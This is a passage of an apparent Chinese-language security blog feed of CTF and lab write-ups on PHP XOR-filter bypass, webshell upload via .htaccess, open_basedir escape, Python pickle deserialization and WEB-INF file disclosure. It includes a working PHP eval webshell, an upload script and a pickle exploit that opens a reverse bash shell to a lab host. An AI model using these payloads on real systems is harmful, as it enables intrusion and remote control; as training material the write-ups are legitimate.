&#39;phpinfo();&#39;;$c_ser = serialize($c);print_r($c_ser);echo &quot;&lt;/br&gt;&quot;;</code></pre><blockquote><p>O:8:”HelloPhp”:2:{s:1:”a”;s:10:”phpinfo();”;s:1:”b”;s:6:”assert”;}</p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200425190223654.png" srcset="/img/loading.gif" alt="image-20200425190223654"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;NPUCTF2020-ReadlezPHP&quot;&gt;&lt;a href=&quot;#NPUCTF2020-ReadlezPHP&quot; class=&quot;headerlink&quot; title=&quot;[NPUCTF2020]ReadlezPHP&quot;&gt;&lt;/a&gt;[NPUCTF2020]ReadlezPHP
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache SSI 远程命令执行漏洞</title>
    <link href="http://yoursite.com/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-04-20T04:32:17.144Z</published>
    <updated>2020-04-20T04:32:17.144Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Apache SSI 远程命令执行漏洞</strong><br>链接：</p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。</p><p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Apache SSI 远程命令执行漏洞&lt;/strong&gt;&lt;br&gt;链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/yuzly/p/11226439.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[SUCTF 2019]EasyWeb</title>
    <link href="http://yoursite.com/2020/04/19/[SUCTF%202019]EasyWeb/"/>
    <id>http://yoursite.com/2020/04/19/[SUCTF%202019]EasyWeb/</id>
    <published>2020-04-19T07:37:26.166Z</published>
    <updated>2020-04-19T07:37:26.166Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easyweb" target="_blank" rel="noopener">题目源码</a></p><pre><code class="php">&lt;?phpfunction get_the_flag(){    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir)){    mkdir($userdir);    }    if(!empty($_FILES[&quot;file&quot;])){        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    }}$hhh = @$_GET[&#39;_&#39;];if (!$hhh){    highlight_file(__FILE__);}if(strlen($hhh)&gt;18){    die(&#39;One inch long, one inch strong!&#39;);}if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>这道题的第一个部分就是bypass这一道道的<code>if</code>语句，要满足所有条件需要</p><ul><li>$hhh的总长度超过18</li><li>需要绕过正则</li><li>需要满足字符串里面出现的字符种类数小于12</li></ul><p>长度的话我们可以构造一个<code>$_GET</code>的变量，然后再取给这个<code>$_GET</code>变量来传递参数就可以了。先用php脚本来看看还剩下哪些字符能够使用</p><pre><code class="php">&lt;?php$ascii=0;for(;$ascii&lt;256;){    if(!preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, chr($ascii))){        echo chr($ascii).&quot;:&quot;.$ascii.&quot;\n&quot;;    }    $ascii++;}    echo &quot;\n&quot;; ?&gt;</code></pre><p>这里面存在了<code>$</code>、<code>%</code>、<code>^</code>这样我们就可以利用字符之间的异或，来构造任意字符来满足我们想要的<code>$_GET</code>变量。</p><pre><code class="php">import stringguess = string.printable_ = []G = []E = []T = []for i in range(256):    for j in range(256):        if ((chr(i) not in guess) &amp; (chr(j) not in guess)):            res = i ^ j            if (chr(res) == &#39;_&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                _.append(result)            if (chr(res) == &#39;G&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                G.append(result)            if (chr(res) == &#39;E&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                E.append(result)            if (chr(res) == &#39;T&#39;):                result = []                result.append(str(hex(i)[2:])+&quot;^&quot;+str(hex(j)[2:]))                T.append(result)print(_,end=&quot;\n&quot;)print(G,end=&quot;\n&quot;)print(E,end=&quot;\n&quot;)print(T,end=&quot;\n&quot;)</code></pre><blockquote><p><strong>我们构造的Payload究竟是怎么样的?</strong></p><p><strong>现在已经知道了 Payload 需要由那些不可见字符组成</strong> , 那么 Payload 究竟是怎样的呢?</p><p>题目中有这么一条限制 : <strong>GET方法获取参数的值不能超过 18 个 字符</strong> , 如果想要在 Payload 中执行一个函数 , 格式肯定 <strong>(xxx^xxx)();</strong> 这样的 . 这还必须是无参函数 .</p><p><strong>但即使是无参函数 , 已经使用的字符( 小括号 , 异或符号 , … ) 也已经使用了6个字符 , 函数名又需要两两字符异或计算得到 , 也就是函数名最多有 ((18 - 6) / 2 = 6)个字符 , 而6个字符连个 phpinfo 都运行不了</strong> , 这样肯定是不可行的 .</p><p>直接调用函数好像是不可行的 , 我们需要换一种思路 —— <strong>比如使用全局变量 , 至少” $ “ 符号还是可以使用的</strong> , 介于<strong>题目中对 Payload 长度有限制</strong> , 最短的全局变量为 : <strong>$_GET</strong> . “ <code>$</code> “本身可用 , 而 <strong>_GET</strong> 的形式大概是 : <strong>{xxxx^xxxx}</strong> 这样的 .</p><p>有了全局变量 , 就可以利用 <strong>${} 中的代码是可以执行的特点</strong> ， 把要运行的函数名作为参数来动态执行 . 也就是<code>${x}();</code>这样的形式 , <strong>函数名的值 “ x “ 可以通过全局方法GET来获取</strong></p><p>因此 , 完整的 Payload 应该为 : <strong>Payload : ${xxxx^xxxx}{x}();&amp;x= …</strong> , 转换后就变成了 <strong>$_GET<a href="http://github.mrkaixin.computer/2019/06/05/BUUCTF做题笔记/" target="_blank" rel="noopener">x</a>;&amp;x= …</strong></p><p>并且 , <strong>“ _ “ 参数的值为 : ${xxxx^xxxx}(x)(); , 长度为 18 个字符 , 恰好满足题目 strlen() 函数的限制</strong></p><p>该函数限制” _ “参数值最多只能使用<strong>12</strong>个不同的字符 , 而现在 <code>${xxxx^xxxx}{x}();</code> 在不考虑 “ x “ 的情况下已经使用了 <strong>7</strong> 个字符了 , <strong>因此 x 最多只能使用 5 个不同的字符</strong></p><p>根据这个思路 , 可以在合理的情况下构造 Payload 了 , 这里以执行 phpinfo() 为例 , 构造 Payload 如下</p></blockquote><p>这个师傅写的特别的详细，点赞！</p><p>所以最后的payload:</p><pre><code class="php">_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=phpinfo</code></pre><p><a href="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/qSmRZN6VHxsU1eC.png" srcset="/img/loading.gif" alt="执行payload">执行payload</a></p><p>然后就是第二关了，我们可以看到源码里有一个<code>get_the_flag</code>函数，我们需要利用这个函数来上传一个shell，这个文件需要满足的要求是</p><ul><li>文件扩展名中不能出现<code>ph</code></li><li>并且文件中不能出现`</li><li>最后通过 exif_imagetype() 函数对文件类型进行检查 , 如果文件不是一张图片 , 则不通过检测 .</li></ul><p>不能出现<code>ph</code>的后缀文件，所以我们就不能直接上传<code>php</code>文件。</p><p>再一个我们从前面的phpinfo中得知题目的php的版本为php7，凑巧的是php7已经删除了<code></code>这种语法了，我们只能利用另外的骚操作</p><p>我的做法是，先上传一个文件，要求如下</p><ul><li>有文件头，可以被<code>exif_imagetype()</code>识别出是一个图片</li><li>里面有base64加密的代码</li></ul><pre><code class="php">shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)</code></pre><p>这里面的<code>\x00\x00\x47\x49\x46\x38\x39\x61</code>-&gt;<code>GIF89a</code>是GIF头，<code>b&quot;00&quot;</code>的作用：用来分割头和php代码。目的是防止之后解密base64解密的时候造成错误。</p><p><a href="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5NqW4xIXYHSfM9y.png" srcset="/img/loading.gif" alt="shell源码">shell源码</a></p><p><a href="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/5EF9zRKcbTMSshw.png" srcset="/img/loading.gif" alt="base64解密">base64解密</a></p><p>但是单单上传一个这个文件是不行的，所以我们需要<code>.htaccess</code>文件来帮助我们让服务器把这个文件解析成php代码，我们才能够真真的利用。</p><pre><code class="python">htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;&quot;&quot;&quot;</code></pre><p>这个后面的路径是上传完第一个shell文件之后产生的。</p><p>贴一下最后的代码</p><pre><code class="python">import requestsimport base64#题目链接url = &quot;http://73706c84-1992-4dba-adbd-b4f109b5b953.node2.buuoj.cn.wetolink.com:82/&quot;payload = &quot;?_=${%81%81%81%81^%de%c6%c4%d5}{%81}();&amp;%81=get_the_flag&quot;shell = b&quot;\x00\x00\x47\x49\x46\x38\x39\x61&quot;+b&quot;00&quot;+base64.b64encode(b&#39;&lt;?php @eval($_POST[&quot;mrkaixin&quot;]);?&gt;&#39;)htaccess = b&quot;&quot;&quot;\x00\x00\x47\x49\x46\x38\x39\x61AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_f4e7685fe689f675c85caeefaedcf40c/shell.aaa&quot;&quot;&quot;&quot;#先上传shell文件,在改路径上传.htaccess文件files = {&#39;file&#39;: (&#39;shell.aaa&#39;, shell, &#39;image/gif&#39;)}# files = {&#39;file&#39;: (&#39;.htaccess&#39;, htaccess, &#39;image/gif&#39;)}r = requests.post(url + payload, files=files)print(r.text)</code></pre><p><a href="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/XhpFZIMvJwCByEt.gif" srcset="/img/loading.gif" alt="操作过程">操作过程</a></p><p>但是有了shell，会发现可以读到当前目录下的文件，但是无法读到根目录下面的flag。</p><p>因为这里还需要绕过<code>open_basedir</code>这里直接给payload了，可以跟着这个<a href="https://www.jianshu.com/p/fbfeeb43ace2" target="_blank" rel="noopener">师傅的教程</a>动手做一下实验</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;));</code></pre><p><a href="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/PgMK9ejmlZhbtdc.png" srcset="/img/loading.gif" alt="读根目录文件">读根目录文件</a></p><p><a href="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2019/10/09/SEavIpjslO7dC1Z.png" srcset="/img/loading.gif" alt="利用file_get_contents读取文件">利用file_get_contents读取文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SUCTF-2019-EasyWeb&quot;&gt;&lt;a href=&quot;#SUCTF-2019-EasyWeb&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]EasyWeb&quot;&gt;&lt;/a&gt;[SUCTF 2019]EasyWeb&lt;/h2&gt;&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>python反序列化漏洞浅析</title>
    <link href="http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
    <id>http://yoursite.com/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
    <published>2020-04-09T02:17:58.000Z</published>
    <updated>2020-04-15T02:19:22.345Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。</p><p>主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。</p><p>引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞</p><p>此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数<strong>wakeup</strong></p><h3 id="0x02-Pickle模块"><a href="#0x02-Pickle模块" class="headerlink" title="0x02 Pickle模块"></a>0x02 Pickle模块</h3><ol><li><p>pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（list、dict、class等）转换为字符流，这个字符流包含反序列化（从字符流构建对象）所需的所有数据。</p></li><li><p>pickle有两个主要方法。第一个是dump-把对象导入到文件；第二个是load-从文件中加载对象。</p><p>实例</p><pre><code>import picklel1 = [&#39;data1&#39;,&#39;data2&#39;,&#39;data3&#39;, &#39;data4&#39;]file = open(&quot;testfile&quot;,&#39;wb&#39;) # 把l1保存到文件pickle.dump(l1, file)   file.close() ##############################################file = open(&quot;testfile&quot;,&#39;r&#39;)# 从文件中加载保存的对象l2 = pickle.load(file)  print(l2)# 输出: [&#39;data1&#39;, &#39;data2&#39;, &#39;data3&#39;]</code></pre></li><li><p>pickle instructions</p><pre><code>cossystem(S&#39;/bin/sh&#39;tR.</code></pre><blockquote><p>Pickle is a stack language which means that the pickle instructions push data onto the stack or pop data off of the stack and operate on it in some fashion. To understand how the canonical pickle works, we need only understand six pickle instructions:</p><ul><li><code>c</code>: Read to the newline as the module name, <code>module</code>. Read the next line as the object name, <code>object</code>. Push <code>module.object</code> onto the stack.</li><li><code>(</code>: Insert a marker object onto the stack. For our purpose, this is paired with <code>t</code> to produce a tuple.</li><li><code>t</code>: Pop objects off the stack until a <code>(</code> is popped and create a tuple object containing the objects popped (except for the <code>(</code>) in the order they were /pushed/ onto the stack. The tuple is pushed onto the stack</li><li><code>S</code>: Read the string in quotes up to the newline and push it onto the stack.</li><li><code>R</code>: Pop a tuple and a <a href="http://stackoverflow.com/questions/111234/what-is-a-callable-in-python" target="_blank" rel="noopener">callable</a> off the stack and call the callable with the tuple as arguments. Push the result onto the stack.</li><li><code>.</code>: End of the pickle.</li></ul></blockquote></li></ol><ul><li><p>c：读取新的一行作为模块名module，读取下一行作为对象名<code>object</code>，然后将<code>module.object</code>压入到堆栈中。</p></li><li><p>(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。</p></li><li><p>t：从堆栈中弹出对象，直到一个“<code>(</code>”被弹出，并创建一个包含弹出对象（除了“<code>(</code>”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。</p></li><li><p>S：读取引号中的字符串直到换行符处，然后将它压入堆栈。</p></li><li><p>R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</p></li><li><p>.：结束pickle。</p><p>说人话：</p></li><li><p>c：接下来的2行内容类似于，<code>os.system</code>、<code>urllib.unquote</code>是<code>module.object</code>的形式。</p></li><li><p>(：就是左括号</p></li><li><p>t：相当于右扩号</p></li><li><p>S：代表本行后面的内容是<code>String</code>，即字符串。</p></li><li><p>R：执行紧靠自己左边的一个括号对中的内容，即<code>(</code> 和他t直接的内容。</p></li><li><p>.：点号结束pickle。</p></li></ul><h3 id="0x03漏洞分析"><a href="#0x03漏洞分析" class="headerlink" title="0x03漏洞分析"></a>0x03漏洞分析</h3><p>类似于php的wakeup魔术方法，python中的<strong>reduce</strong>，可以在被反序列化的时候执行。具体内容请参考Python的官方库文档。而且并不止这一个函数。</p><p>如果序列化的内容可控，只需要将相应代码写入<strong>reduce</strong>函数中，接收端在反序列化的时候就会自动执行。</p><p>下面是一个简单的示例：</p><p>exp:</p><pre><code>import pickleimport subprocessclass m3lon(object):  def __reduce__(self):    return (subprocess.Popen,((&#39;cmd.exe&#39;,),))pickle.dumps(m3lon())# 输出：&quot;csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.&quot;</code></pre><p>生成payload：<code>csubprocess\nPopen\np0\n((S&#39;cmd.exe&#39;\np1\ntp2\ntp3\nRp4\n.</code></p><p>下面模拟接收端</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/1.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" srcset="/img/loading.gif" alt="img"></a></p><p>弹出shell！</p><h3 id="0x04漏洞利用"><a href="#0x04漏洞利用" class="headerlink" title="0x04漏洞利用"></a>0x04漏洞利用</h3><p>接下来以P神github仓库里的<a href="https://github.com/vulhub/vulhub/blob/master/python/unpickle" target="_blank" rel="noopener">某个开源靶场</a>为例讲解一下实际环境下的漏洞利用,可部署到本地docker复现。</p><p>app.py</p><pre><code>import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameif __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>exp.py</p><pre><code>#!/usr/bin/env python3import requestsimport pickleimport osimport base64class exp(object):    def __reduce__(self):        s = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.17.0.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&quot;&quot;&quot;        return (os.system, (s,))e = exp()s = pickle.dumps(e)response = requests.get(&quot;http://172.19.0.2:8000/&quot;, cookies=dict(    user=base64.b64encode(s).decode()))print(response.content)</code></pre><p><strong>分析</strong></p><p>反序列化的内容为user，通过cookie传输(用户可控)，于是pickle的反序列化漏洞便产生了，通过上面的exp可以查看我们生成的payload</p><pre><code>cposix\nsystem\np0\n(S\&#39;python -c \\\&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.19.0.1&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);\\\&#39;\&#39;\np1\ntp2\nRp3\n.</code></pre><p>接收端在反序列化pickle.loads(user)过程中会自动执行<strong>reduce</strong>方法，弹出bash.</p><p><strong>流程</strong></p><p>利用过程中注意查看本地docker ip，以及docker环境中的ip地址，对应修改exp.py，上面的exp是我在本地修改好的.</p><p><a href="https://m3lon.github.io/2018/04/12/浅析python-unpickle反序列化漏洞/2.png" target="_blank" rel="noopener"><img src="https://m3lon.github.io/2018/04/12/%E6%B5%85%E6%9E%90python-unpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png" srcset="/img/loading.gif" alt="img"></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WEB-INF</title>
    <link href="http://yoursite.com/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/</id>
    <published>2020-04-06T08:31:58.000Z</published>
    <updated>2020-04-15T02:18:11.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"><a href="#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码" class="headerlink" title="WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码"></a>WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</h2><h4 id="https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java"><a href="#https-buuoj-cn-challenges-RoarCTF-202019-Easy-20Java-https-buuoj-cn-challenges-RoarCTF-2019-Easy-Java" class="headerlink" title="[https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Java)"></a>[<a href="https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java]</a>(<a href="https://buuoj.cn/challenges#[RoarCTF" target="_blank" rel="noopener">https://buuoj.cn/challenges#[RoarCTF</a> 2019]Easy Java)</h4><h3 id="首先看到一个页面-点击下help看看啥情况。"><a href="#首先看到一个页面-点击下help看看啥情况。" class="headerlink" title="首先看到一个页面,点击下help看看啥情况。"></a>首先看到一个页面,点击下help看看啥情况。</h3><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/1.jpg" srcset="/img/loading.gif" alt="img"></a></p><p>发现输出一串</p><pre><code>java.io.FileNotFoundException:{help.docx}</code></pre><p>可能是报错信息，打开Brup截取请求信息</p><pre><code>GET /Download?filename=help.docx HTTP/1.1Host: a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</code></pre><p>通过查询发现要改成POST，得到许多有用信息</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/3.jpg" srcset="/img/loading.gif" alt="img"></a></p><pre><code>com.Wm.ctf.DownloadController.doPost</code></pre><p>这个信息跟CTF可能有关,记一下一般有这样都有泄露。</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/4.jpg" srcset="/img/loading.gif" alt="img"></a></p><h3 id="因为缺少JAVA项目的开发经验，所以查了大量的资料"><a href="#因为缺少JAVA项目的开发经验，所以查了大量的资料" class="headerlink" title="因为缺少JAVA项目的开发经验，所以查了大量的资料"></a>因为缺少JAVA项目的开发经验，所以查了大量的资料</h3><p>我们访问下WEB-INF/web.xml这个文件</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/5.jpg" srcset="/img/loading.gif" alt="img"></a></p><p>得到了个flag的路径!!!!</p><h2 id="插入一个知识点"><a href="#插入一个知识点" class="headerlink" title="插入一个知识点"></a>插入一个知识点</h2><pre><code>WEB-INF主要包含一下文件或目录:/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload:"></a>构造payload:</h2><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p>base64解码得到flag</p><p><a href="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" target="_blank" rel="noopener"><img src="https://chen.oinsm.com/2019/10/20/RoarCTF-2019-Easy-Java/6.jpg" srcset="/img/loading.gif" alt="img"></a></p><h3 id="PS-GET不能读取文件有点懵，没想到居然要改成POST"><a href="#PS-GET不能读取文件有点懵，没想到居然要改成POST" class="headerlink" title="PS: GET不能读取文件有点懵，没想到居然要改成POST"></a>PS: GET不能读取文件有点懵，没想到居然要改成POST</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码&quot;&gt;&lt;a href=&quot;#WEB-INF主要通过找到web-xml文件，推断class文件的路径，最后直接class文件，在通过反
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【极客大挑战2019】PHP</title>
    <link href="http://yoursite.com/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/"/>
    <id>http://yoursite.com/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/</id>
    <published>2020-04-02T08:31:58.000Z</published>
    <updated>2020-04-02T08:53:20.743Z</updated>
    
    <content type="html"><![CDATA[<p>这一题有两个地方卡住我了，第一个是没有想到备份名叫<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a>.<br>第二个是public、protected与private在序列化时的区别。<br><img src="/img/27.png" srcset="/img/loading.gif" alt=""><br>于是在url栏中输入<a href="http://www.zip得到网站源码，发现flag.php进行提交，错误。" target="_blank" rel="noopener">www.zip得到网站源码，发现flag.php进行提交，错误。</a><br>观看源码：<br>index.php</p><pre><code>&lt;?phpinclude &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);?&gt;</code></pre><p>发现了关键代码，考的应该是反序列化漏洞，去看class.php<br>class.php:</p><pre><code>&lt;?php include &#39;flag.php&#39;;  error_reporting(0);  class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo 